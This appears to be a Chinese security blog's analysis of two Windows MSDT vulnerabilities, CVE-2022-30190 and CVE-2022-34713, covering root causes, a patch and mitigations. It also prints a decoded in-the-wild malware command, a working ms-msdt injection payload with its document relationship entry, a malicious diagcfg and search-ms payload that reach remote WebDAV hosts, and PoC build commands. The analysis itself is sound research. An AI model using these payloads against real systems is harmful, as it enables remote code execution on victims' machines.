    <content><![CDATA[<h2 id="相关知识"><a href="#相关知识" class="headerlink" title="相关知识"></a>相关知识</h2><h4 id="WTP框架"><a href="#WTP框架" class="headerlink" title="WTP框架"></a>WTP框架</h4><p>windows疑难解答平台（WTP）为ISV、OEM和管理员提供了疑难解答包的过程，这些包用于发现和解决计算机上的问题。WTP框架提供自动化检测修复方式。</p>
<h4 id="底层结构"><a href="#底层结构" class="headerlink" title="底层结构"></a>底层结构</h4><img src="/2023/04/16/CVE-2022-30190%20MSDT%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220816150216855.png" alt="image-20220816150216855" style="zoom: 67%;">

<ul>
<li>WTP由两个进程组成，Process1是带UI的Troubleshooting Run-time Engine，Process2用于提供window PowerShell Runtime环境。</li>
<li>Process2提供的PowerShell运行时环境提供了4条特殊的PowerShell命令：Get-DiagInput、Update-DiagReport、Update-DiagRootCause、Write-DiagProgress</li>
<li>Troubleshooting Pack运行在Process1和Process2所构建的平台上。</li>
</ul>
<h4 id="工作原理"><a href="#工作原理" class="headerlink" title="工作原理"></a>工作原理</h4><ul>
<li><p>故障排除包是用户可编程部分，本质上是一组针对特定故障的检测修复脚本。Process1(Troubleshooting Run-time Engine)通过故障排除包获取检测脚本检测问题，查出问题交给Process2(PowerShell)运行处理。</p>
</li>
<li><p>Process1是msdt.exe，Process2是sdiagnhost.exe</p>
</li>
<li><p>sdiagnhost.exe为了给msdt.exe提供运行脚本的能力，注册了IScriptedDiagnosticHost com接口，相应的com方法是RunScript()</p>
</li>
<li><p>故障排除包的设计基于三个步骤：检测问题（troubleshooting）、解决问题（resolution）和验证解决方案（verificationg），对应TS、RS、VF三种脚本。</p>
</li>
</ul>
<h4 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h4><p>WTP提供了一系列默认故障排除包，可以在ms-msdt协议里通过-id参数指定。</p>
<p>CVE-2022-30190使用PCWDiagnostic，用于程序兼容性故障排除。</p>
<h2 id="0x00-漏洞描述"><a href="#0x00-漏洞描述" class="headerlink" title="0x00 漏洞描述"></a>0x00 漏洞描述</h2><p>Microsoft Office MSDT存在远程代码执行漏洞，攻击者可以利用Office文件中的远程模块功能，访问远程服务器上挂载的恶意HTML文件，之后通过ms-msdt URL来执行恶意powershell代码，漏洞在宏被禁用的情况下依然可以利用。</p>
<h2 id="0x01-漏洞分析"><a href="#0x01-漏洞分析" class="headerlink" title="0x01 漏洞分析"></a>0x01 漏洞分析</h2><p>CVE-2022-30190本质上是PowerShell代码注入漏洞。MSDT和Powershell的C:\Windows\diagnostics\system\PCW\TS_ProgramCompatibilityWizard.ps1脚本交互，相关的IT_BrowseForFile参数存在命令注入，最终的调用PowerShell动态执行。</p>
<p><strong>影响版本：</strong></p>
<pre class="line-numbers language-none"><code class="language-none">Microsoft Windows Server 2008 SP2
Microsoft Windows 11
Microsoft Windows Server 2019
Microsoft Windows 10 1607
Microsoft Windows Server 20H2
Microsoft Windows Server 2022
Microsoft Windows Server 2016 (Server Core installation)
Microsoft Windows Server 2016 null
Microsoft Windows 10
Microsoft Windows 10 1809
Microsoft Windows Server 2008 R2 SP1
Microsoft Windows Server 2022 (Server Core installation)
Microsoft Windows Server 2019 (Server Core installation)
Microsoft Windows 8.1
Microsoft Windows 10 20H2
Microsoft Windows 10 21H2
Microsoft Windows Server 2012 R2
Microsoft Windows 7 SP1
Microsoft Windows RT 8.1 SP0
Microsoft Windows Server 2012
Microsoft Windows 10 21H1
Microsoft Windows Server 2022 Azure Edition Core Hotpatch <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h4 id="样本分析"><a href="#样本分析" class="headerlink" title="样本分析"></a>样本分析</h4><p>样本是docx文件，解压，其中/word/_rels目录下的document.xml.rels文件包含对<a href="https://www.xmlformats.com/office/word/2022/wordprocessingDrawing/RDF842l.html%E7%9A%84%E5%A4%96%E9%83%A8%E5%BC%95%E7%94%A8%E3%80%82">https://www.xmlformats.com/office/word/2022/wordprocessingDrawing/RDF842l.html的外部引用。</a></p>
<p><img src="/2023/04/16/CVE-2022-30190%20MSDT%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220816163900629.png"></p>
<p><strong>RDF842l.html原始内容：</strong></p>
<p>使用了4个参数，IT_RebrowseForFile、IT_LaunchMethod、IT_SelectProgram、IT_BrowseForFile。利用IT_BrowseForFile参数加载了powershell脚本执行恶意功能。4096字节的A填充，是windows诊断工具的缓冲区大小。</p>
<pre class="line-numbers language-none"><code class="language-none">&lt;!doctype html&gt;
&lt;html lang="en"&gt;
&lt;body&gt;
&lt;script&gt;
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      
&lt;/script&gt;
&lt;/body&gt;
&lt;/html&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>首先使用window.location.href创建窗口，ms-msdt是windows诊断工具，之后调用powershell，执行的内容经过了base64加密</p>
<p><img src="/2023/04/16/CVE-2022-30190%20MSDT%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220817165023922.png"></p>
<p>解密得到</p>
<pre class="line-numbers language-none"><code class="language-none">$cmd = "c:\windows\system32\cmd.exe";Start-Process $cmd -windowstyle hidden -ArgumentList "/c taskkill /f /im msdt.exe";Start-Process $cmd -windowstyle hidden -ArgumentList "/c cd C:\users\public\&amp;&amp;for /r %temp% %i in (05-2022-0438.rar) do copy %i 1.rar /y&amp;&amp;findstr TVNDRgAAAA 1.rar&gt;1.t&amp;&amp;certutil -decode 1.t 1.c &amp;&amp;expand 1.c -F:* .&amp;&amp;rgb.exe";<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>启动隐藏窗口：</p>
<pre class="line-numbers language-none"><code class="language-none">如果msdt.exe正在运行，终止它
循环遍历RAR文件中的文件，查找编码CAB文件的Base64字符串
将Base64字符串编码的cab文件保存1.c
将1.c cab文件展开到当前目录
最后执行rgb.exe<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>因此window会无限制执行powershell.如果修改成想要执行的代码，就会导致远程代码执行漏洞。因此，只需修改xml文件，引用网站上的恶意代码就行。</p>
<h4 id="触发条件"><a href="#触发条件" class="headerlink" title="触发条件"></a>触发条件</h4><p>在Microsoft.Windows.Diagnosis.SDHost.dll里的Microsoft.Windows.Diagnosis.ManagedHost.Run Script()方法实现了IScriptedDiagnosticHost com接口里的RunScript方法，用于给msdt.exe提供执行检测脚本所需要的PowerShell运行时环境，然后重新触发漏洞。RunScript()方法一共被触发了两次，第一次用于调用TS脚本，第二次用于调用RS脚本。</p>
<p>要触发对RS_ProgramCompatibityWizard.ps1的调用，要先通过TS_ProgramCompatibilityWizard.ps1脚本的检测</p>
<h4 id="TS-ProgramCompatibilityWizard-ps1"><a href="#TS-ProgramCompatibilityWizard-ps1" class="headerlink" title="TS_ProgramCompatibilityWizard.ps1"></a>TS_ProgramCompatibilityWizard.ps1</h4><p>Get-DiagInput用于从用户获取输入的信息，获取传入的IT_BrowseForFile参数，并赋值给$selectedProgram变量。</p>
<pre class="line-numbers language-none"><code class="language-none">if(-not($ChoicesAvailable))
{
    $selectedProgram = Get-DiagInput -id IT_BrowseForFile
}
else
{
    $selectedProgram = Get-DiagInput -id IT_SelectProgram -choice $choices

	## If the user chose the option "Not listed" we will ask them to browse for a file
    if($selectedProgram -eq "NotListed")
    {
        $selectedProgram = Get-DiagInput -id IT_BrowseForFile
    }
}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>调用Test-Selection方法对$selectedProgram进行检测。使用test_path命令来对路径进行检测，确保路径存在，对于/../返回到根路径之外的路径返回True，要求路径的扩展名为exe和msi。</p>
<pre class="line-numbers language-none"><code class="language-none">function Test-Selection([string]$appPath)
{
    $testresult = $false

    if(($appPath -ne $null) -and -not([String]::IsNullOrEmpty($appPath)))
    {
        $testresult = test-path -literalpath $appPath

        if($testresult)
        {
            if(-not($type::IsFileProtected($appPath)))
            {
                $extension = [System.IO.Path]::GetExtension($appPath)
                $testresult = ($extension -eq ".exe") -or ($extension -eq ".msi")
            }
            else
            {
                $testresult = $false
                Set-Variable -name rebrowseText -value $CompatibilityStrings.Text_FILE_PROTECTED -scope global
            }
        }
    }

    Set-Variable -name appValid -value $testResult -scope global
}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>从$selectedProgram提取文件名，过滤$符号，防止代码注入。由于脚本直接使用$,$实际会在过滤前被PowerShell引擎解析，所以无法起到过滤$字符的作用。</p>
<p>正确写法应为 $appName = [System.IO.Path]::GetFileNameWithoutExtension($selectedProgram).Replace(“`$”, “``$”)</p>
<pre class="line-numbers language-none"><code class="language-none">while(-not($appValid))
{
    $InstanceId++
    $selection = $selectedProgram
    $selectedProgram = Get-DiagInput -id IT_RebrowseForFile -parameter @{ "SelectedProgram" = $selection; "RebrowseText" = $rebrowseText; "Instance" = $InstanceId }
    Set-Variable -name rebrowseText -value $CompatibilityStrings.Text_FILE_INVALID -scope global
    Test-Selection($selectedProgram)
}

$appName = [System.IO.Path]::GetFileNameWithoutExtension($selectedProgram).Replace("$", "`$")<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>TS最后使用Update-DiagRootCause命令，用于报告root cause的状态。会触发RS_脚本，parameter指定的字典会被作为参数传给脚本，导致第二次调用RunScript()方法，并且参数中-TargetPath可控，进而触发了漏洞。</p>
<pre class="line-numbers language-none"><code class="language-none">if ($UpdateChoice -eq "ts_Manual")
{
    $Env:RecommendedLayer = $AppInfo[2]
    Update-DiagRootCause -id "RC_IncompatibleApplication" -iid $appName -Detected $true -parameter @{ "TARGETPATH" = $selectedProgram; "APPNAME" = $appName}
}
else
{
    Start-Process -FilePath $AppInfo[1]
}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="0x02-漏洞利用"><a href="#0x02-漏洞利用" class="headerlink" title="0x02 漏洞利用"></a>0x02 漏洞利用</h2><p>1.新建word文档，后缀更改为zip，打开后编辑/word/_regs目录下的document.xml.rels按照格式加入。</p>
<pre class="line-numbers language-none"><code class="language-none">&lt;Relationship  Id="rId1337" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/oleObje ct" Target="mhtml:http://localhost:80/exploit.html!x-usc:http://localhost:80/exploit.html" TargetMode="External"/&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>2.建一个文件夹作为web站点目录，新建exploit.html文件添加（弹计算器）</p>
<pre class="line-numbers language-none"><code class="language-none">&lt;script&gt;
location.href = "ms-msdt:/id PCWDiagnostic /skip force /param \"IT_RebrowseForFile=?
IT_LaunchMethod=ContextMenu IT_BrowseForFile=/../../$(\\\\localhost\\c$\\windows\\system32\\calc)/.exe\"";
&lt;script&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>IT_RebrowseForFile参数开头至少需要两次/../目录遍历</p>
<p>包含$()中的代码会通过PowerShell执行</p>
<p>.exe必须是IT_BrowseForFile参数末尾的最后一个字符串</p>
<h2 id="0x03-漏洞修复"><a href="#0x03-漏洞修复" class="headerlink" title="0x03 漏洞修复"></a>0x03 漏洞修复</h2><p><strong>缓解方法：</strong></p>
<p>1.禁用MSDT URL协议阻止使用漏洞的恶意攻击。</p>
<p>2.禁用MSDT URL协议可防止故障排除应用程序作为链接启动，包括整个操作系统的链接。</p>
<p><strong>禁用方法：</strong></p>
<p>1.以管理员身份运行命令提示符</p>
<p>2.备份注册表项，执行命令<code>reg export HKEY_CLASSES_ROOT\ms-msdt [filename]</code></p>
<p>3.执行命令<code>reg delete HKEY_CLASSES_ROOT\ms-msdt</code></p>
<p><strong>撤销禁用：</strong></p>
<p>1.以管理员身份运行命令提示符</p>
<p>2.恢复注册表项，执行命令“reg import [filename]”</p>
]]></content>
      <categories>
        <category>CVE</category>
      </categories>
      <tags>
        <tag>CVE</tag>
      </tags>
  </entry>
  <entry>
    <title>CVE-2022-34713 MSDT目录遍历漏洞分析</title>
    <url>/2023/05/15/CVE-2022-34713%20MSDT%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<h2 id="0x00-漏洞描述"><a href="#0x00-漏洞描述" class="headerlink" title="0x00 漏洞描述"></a>0x00 漏洞描述</h2><p>CVE-2022-34713是Microsoft Windows支持诊断工具（MSDT）RCE漏洞。存在路径穿越的脆弱性，攻击者可以遍历目录，将恶意可执行程序放置Window启动文件夹。<br>影响版本：</p>
<pre class="line-numbers language-none"><code class="language-none">Windows 11
Server 2022
Server, version 20H2
Server 2019
Windows 10
Server 2016
Server 2012 R2
Server 2012
Windows 8.1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="0x01-漏洞分析"><a href="#0x01-漏洞分析" class="headerlink" title="0x01 漏洞分析"></a>0x01 漏洞分析</h2><p>CVE-2022-34713是Microsoft Windows支持诊断工具（MSDT）RCE漏洞，位于%WINDIR%\System32\msdt.exe,与以下文件类型相关联</p>
<table>
<thead>
<tr>
<th><strong>File type</strong></th>
<th><strong>Description</strong></th>
</tr>
</thead>
<tbody><tr>
<td>.diagcab</td>
<td>Diagnostic cabinet file</td>
</tr>
<tr>
<td>.diagpkg</td>
<td>Diagnostic package file</td>
</tr>
<tr>
<td>.diagcfg</td>
<td>Diagnostic configuration file</td>
</tr>
</tbody></table>
<p>关注其中的diagcab文件。解开后拿到Custom.diagcfg:</p>
<pre class="line-numbers language-none"><code class="language-none">&lt;?xml version="1.0" encoding="utf-8"?&gt;
&lt;PackageConfiguration xmlns="http://www.microsoft.com/schemas/dcm/configuration/2008"&gt;
  &lt;Execution&gt;
    &lt;Package Path="\\webdav-test.herokuapp.com@ssl\DavWWWRoot\package" /&gt;
    &lt;Name&gt;Some name&lt;/Name&gt;
    &lt;Description&gt;Some description&lt;/Description&gt;
    &lt;Icon&gt;@%windir%\diagnostics\system\WindowsUpdate\DiagPackage.dll,-1001&lt;/Icon&gt;
  &lt;/Execution&gt;

  &lt;Index&gt;
    &lt;Id&gt;Custom&lt;/Id&gt;
    &lt;RequiresAdminPrivileges&gt;false&lt;/RequiresAdminPrivileges&gt;
    &lt;PrivacyUrl&gt;http://go.microsoft.com/fwlink/?LinkId=190175&lt;/PrivacyUrl&gt;
    &lt;Version&gt;1.0&lt;/Version&gt;
    &lt;PublisherName&gt;Microsoft Corporation&lt;/PublisherName&gt;
    &lt;Category&gt;@%windir%\system32\DiagCpl.dll,-412&lt;/Category&gt;
    &lt;Keyword&gt;@%windir%\system32\DiagCpl.dll,-27&lt;/Keyword&gt;
  &lt;/Index&gt;
&lt;/PackageConfiguration&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><code>&lt;Execution&gt;</code>标签下说明了该诊断包的执行行为, msdt会访问<code>&lt;Package Path&gt;</code>给出的路径。</p>
<p>漏洞位于<code>sdiageng.dll</code>中，该库从diagcab的XML文件中获取攻击者提供的文件夹路径，当包获取完成后, msdt将对其进行签名检查, 它将包的副本复制到<code>%TEMP%\SDIAG_&lt;UUID&gt;</code>的临时目录, 调用函数<code>sdiageng!SdpCopyDirectory</code>。在此过程中枚举攻击者文件夹中的文件，获取每个文件的文件名，然后将本地临时文件路径和该文件名拼接用来创建文件在计算机上的本地路径。</p>
<h2 id="0x02-漏洞利用"><a href="#0x02-漏洞利用" class="headerlink" title="0x02 漏洞利用"></a>0x02 漏洞利用</h2><h4 id="基本思路"><a href="#基本思路" class="headerlink" title="基本思路"></a>基本思路</h4><p>设置一个托管恶意.diagcab文件的webdav服务器，当访问.diagcab文件的链接或者下载时，会将执行路径穿越，把可执行程序写入C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup,每次启动自动执行。</p>
<h4 id="利用步骤"><a href="#利用步骤" class="headerlink" title="利用步骤"></a>利用步骤</h4><p>1、创建webdav服务器</p>
<p>实现运行webdav服务的脚本或程序, 部署在服务端。注册并部署客户端访问的package路径。</p>
<p>2、构造<code>diagcfg</code>文件</p>
<p>测试用的<code>diagcfg</code>中的package:</p>
<pre class="line-numbers language-none"><code class="language-none">&lt;Package Path="\\127.0.0.1\DavWWWRoot\package" /&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>3、构造辅助利用文件: <code>diagcab</code>或<code>docx</code>文档</p>
<p>4、投递用户, 打开构造后的文件</p>
<p> 注: 目标环境需要开启webclient服务, 否则无法访问webdav的UNC路径。</p>
<h4 id="利用的文件类型-diagcab"><a href="#利用的文件类型-diagcab" class="headerlink" title="利用的文件类型: diagcab"></a>利用的文件类型: <code>diagcab</code></h4><p>将<code>diagcfg</code>打包为<code>diagcab</code>, 双击打开后漏洞利用完成:</p>
<p><img src="/2023/05/15/CVE-2022-34713%20MSDT%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220815155250555.png"></p>
<p>该漏洞只能做到载荷投放, 需要通过其他方式才可运行。</p>
<p>使用docker</p>
<p>1.构建Custom.diagcfg</p>
<pre class="line-numbers language-none"><code class="language-none">./build-malicious-diagcfg.sh --url [WEBDAV_URL]<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>2.构建hotfix895214.diagcab,移至./webdav/diagcab-webdav-poc/config目录,将可执行文件放入./webdav/malicious</p>
<pre class="line-numbers language-none"><code class="language-none">cabarc.exe n hotfix895214.diagcab Custom.diagcfg<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>3.启动服务</p>
<pre class="line-numbers language-none"><code class="language-none">cd ./webdav/diagcab-webdav-poc
perl diagcab-webdav-poc.pl<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>或者直接使用docker直接执行<code>./hurry-dogwalk.sh [WEBDAV_URL]</code></p>
<p><img src="/2023/05/15/CVE-2022-34713%20MSDT%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220815155349317.png"></p>
<h4 id="利用的文件类型-docx"><a href="#利用的文件类型-docx" class="headerlink" title="利用的文件类型: docx"></a>利用的文件类型: docx</h4><p>解开.docx样本文件，关注其中/word/_rels目录下的document.xml.rels文件。会对外部文件进行引用执行。</p>
<pre class="line-numbers language-none"><code class="language-none">Target="https://irsl.github.io/microsoft-diagcab-rce-poc/payload.html!x-usc:https://irsl.github.io/microsoft-diagcab-rce-poc/payload.html" TargetMode = "External"/&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>payload.html</p>
<pre class="line-numbers language-none"><code class="language-none">&lt;!doctype html&gt;
&lt;html lang="en"&gt;
&lt;body&gt;
&lt;script&gt;
...
window.location.href = "search-ms:query=i-repair-everything-on-your-computer.diagcab&amp;crumb=location:%5C%5Cwebdav-test.herokuapp.com%40SSL%5CDavWWWRoot%5Cconfig&amp;displayname=Important%20update"
&lt;/script&gt;
&lt;/body&gt;
&lt;/html&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>执行payload访问webdav</p>
<h2 id="0x03-补丁分析"><a href="#0x03-补丁分析" class="headerlink" title="0x03 补丁分析"></a>0x03 补丁分析</h2><h3 id="sdiageng-SdpCopyDirectory"><a href="#sdiageng-SdpCopyDirectory" class="headerlink" title="sdiageng!SdpCopyDirectory"></a>sdiageng!SdpCopyDirectory</h3><p>位于<code>sdiageng!SdpCopyDirectory</code> (19044.1899):</p>
<p><img src="/2023/05/15/CVE-2022-34713%20MSDT%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220815155426628.png"></p>
<p>添加了检查目录的逻辑。</p>
<pre class="line-numbers language-none"><code class="language-none">__int64 __fastcall SdpCopyDirectory(const unsigned __int16 *aPckSource, const unsigned __int16 *aTmpSDiagPath)
{
  const unsigned __int16 *lsTmpSDiagPath; // r13
  const unsigned __int16 *lPckSource; // r12
  char bFlagTurnOffCheck; // di
  LSTATUS lRes1; // eax
  __int64 v6; // r8
  unsigned __int64 lRes2; // r9
  char *hFind; // r15
  __int64 itraceCode1; // r8
  int dwLastError5; // er9
  unsigned int dwLastError2; // ebx
  LSTATUS dwRet1; // eax
  __int64 v13; // r8
  signed int dwRet2; // ebx
  wchar_t *sWebDavFile; // rsi
  wchar_t *sTmpSDiagFile; // r14
  int dwLastError3; // er9
  __int64 itraceCode2; // r8
  signed int dwLastError4; // eax
  signed int dwLastError6; // eax
  __int64 v21; // r8
  signed int dwLastError1; // eax
  BYTE Data[4]; // [rsp+30h] [rbp-D0h]
  DWORD cbData; // [rsp+34h] [rbp-CCh]
  DWORD Type; // [rsp+38h] [rbp-C8h]
  HKEY hKey; // [rsp+40h] [rbp-C0h]
  struct _WIN32_FIND_DATAW FindFileData; // [rsp+50h] [rbp-B0h]
  wil::details::in1diag3 *retaddr; // [rsp+2E8h] [rbp+1E8h]

  lsTmpSDiagPath = aTmpSDiagPath;
  lPckSource = aPckSource;
  if ( byte_7FFC50EF27F8 )
  {
    bFlagTurnOffCheck = byte_7FFC50EF2858;
    goto DEBUG_TRACE1;
  }
  hKey = 0i64;                                  // TurnOffCheck Registry key turned on
  lRes1 = RegOpenKeyExW(
            HKEY_LOCAL_MACHINE,
            L"Software\\Policies\\Microsoft\\Windows\\ScriptedDiagnostics",
            0,
            0x20019u,
            &amp;hKey);
  lRes2 = lRes1 | 0x80070000;
  if ( lRes1 &lt;= 0 )
    lRes2 = lRes1;
  if ( (lRes2 &amp; 0x80000000) != 0i64 )
  {
    wil::details::in1diag3::_Log_Hr(retaddr, 0x7EA, v6, lRes2);
TURNOFFCHECK_OFF:
    bFlagTurnOffCheck = 1;
    goto DEBUG_TRACE1;
  }
  if ( !hKey )
    goto TURNOFFCHECK_OFF;
  *Data = 0;
  Type = 4;
  cbData = 4;
  dwRet1 = RegQueryValueExW(hKey, L"TurnOffCheck", 0i64, &amp;Type, Data, &amp;cbData);
  dwRet2 = dwRet1 | 0x80070000;
  if ( dwRet1 &lt;= 0 )
    dwRet2 = dwRet1;
  if ( dwRet2 &lt; 0 )
    wil::details::in1diag3::_Log_Hr(retaddr, 0x7FB, v13, dwRet2);
  if ( hKey )
    RegCloseKey(hKey);
  if ( dwRet2 &lt; 0 || (bFlagTurnOffCheck = 0, !*Data) )
    bFlagTurnOffCheck = 1;
  byte_7FFC50EF2858 = bFlagTurnOffCheck;
  byte_7FFC50EF27F8 = 1;
DEBUG_TRACE1:
  hFind = 0i64;
  if ( !lPckSource )                            // Check arguments for errors
  {
    itraceCode1 = 2103i64;
DEBUG_TRACE2:
    dwLastError5 = -2147024809;
DEBUG_TRACE3:
    dwLastError2 = dwLastError5;
    SdpDebugTrace(1u, L"SdpCopyDirectory", itraceCode1, dwLastError5);
    return dwLastError2;
  }
  if ( !lsTmpSDiagPath )
  {
    itraceCode1 = 2104i64;
    goto DEBUG_TRACE2;
  }
  sWebDavFile = operator new[](0x208ui64);
  if ( !sWebDavFile )
  {
    dwLastError5 = -2147024882;
    itraceCode1 = 2107i64;
    goto DEBUG_TRACE3;
  }
  sTmpSDiagFile = operator new[](0x208ui64);
  if ( !sTmpSDiagFile )
  {
    dwLastError3 = -2147024882;
    itraceCode2 = 2110i64;
    dwLastError2 = -2147024882;
    goto DEBUG_TRACE5;
  }
  dwLastError4 = StringCchPrintfW(sWebDavFile, 260i64, L"%s\\*", lPckSource);
  dwLastError2 = dwLastError4;
  if ( dwLastError4 &lt; 0 )
  {
    itraceCode2 = 2113i64;
    goto DEBUG_TRACE4;
  }
  hFind = FindFirstFileW(sWebDavFile, &amp;FindFileData);// Search for file or directory in WebDavRoot\*
  if ( (hFind - 1) &lt;= 0xFFFFFFFFFFFFFFFDui64 )
  {
    do
    {
      if ( !(FindFileData.dwFileAttributes &amp; FILE_ATTRIBUTE_DIRECTORY) )// Isn't it a directory? Setup sWebDavFile and sTmpSDiagFile
      {
        dwLastError4 = StringCchPrintfW(sWebDavFile, 260i64, L"%s\\%s", lPckSource, FindFileData.cFileName);
        dwLastError2 = dwLastError4;
        if ( dwLastError4 &lt; 0 )
        {
          itraceCode2 = 2134i64;
DEBUG_TRACE4:
          dwLastError3 = dwLastError4;
DEBUG_TRACE5:
          SdpDebugTrace(1u, L"SdpCopyDirectory", itraceCode2, dwLastError3);
          break;
        }
        dwLastError4 = StringCchPrintfW(sTmpSDiagFile, 260i64, L"%s\\%s", lsTmpSDiagPath, FindFileData.cFileName);
        dwLastError2 = dwLastError4;
        if ( dwLastError4 &lt; 0 )
        {
          itraceCode2 = 0x85Di64;
          goto DEBUG_TRACE4;
        }
        if ( bFlagTurnOffCheck )                // Is TurnOffCheck turned off?
        {
          *Data = 0;
          dwLastError6 = SdpIsSubDirectory(lPckSource, sWebDavFile, Data);// Check if any WebDav file is sub-directory of package source 
          if ( dwLastError6 &lt; 0 )
            goto REPORT_FAILURE;
          if ( !*Data )
            continue;
          *Data = 0;
          dwLastError6 = SdpIsSubDirectory(lsTmpSDiagPath, sTmpSDiagFile, Data);// Check if any file at %TMP\SDIAG_random-clsid is sub-directory of folder %TMP%\SDIAG_random-clsid
          if ( dwLastError6 &lt; 0 )
          {
REPORT_FAILURE:
            wil::details::in1diag3::_Log_Hr(retaddr, 0x80D, v21, dwLastError6);
            continue;
          }
          if ( !*Data )                         // Result is stored at "Data": *Data=0x1 =&gt; CopyFile, if not: continue. 
                                                // So this is actually the ##DogWalk vuln check.
            continue;
        }
        if ( CopyFileW(sWebDavFile, sTmpSDiagFile, 1) )// Vulnerable CopyFile op
        {
          dwLastError2 = 0;
        }
        else
        {
          dwLastError1 = GetLastError();
          dwLastError2 = dwLastError1 | 0x80070000;
          if ( dwLastError1 &lt;= 0 )
            dwLastError2 = dwLastError1;
          if ( (dwLastError2 &amp; 0x80000000) != 0 )
          {
            dwLastError3 = dwLastError2;
            itraceCode2 = 2151i64;
            goto DEBUG_TRACE5;
          }
        }
      }
    }
    while ( FindNextFileW(hFind, &amp;FindFileData) );// File Search
  }
  operator delete(sWebDavFile);
  if ( sTmpSDiagFile )
    operator delete(sTmpSDiagFile);
  if ( (hFind - 1) &lt;= 0xFFFFFFFFFFFFFFFDui64 )
    FindClose(hFind);
  return dwLastError2;
}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>读取TurnoffCheck设置。  检查参数是否有错误。  检查WebDAVROOT中是否存在文件夹或文件\，如果存在则继续。  如果turnoffcheck setup，则copyfile不进行其他检查。  否则，检查是否有任何WebDAV文件是包源的子目录。  然后，检查是否有任何文件是文件夹%tmp%\sdiag_random-clsid的子目录。  如果*data=1，则copyfile，否则文件/文件夹搜索将继续。 </p>
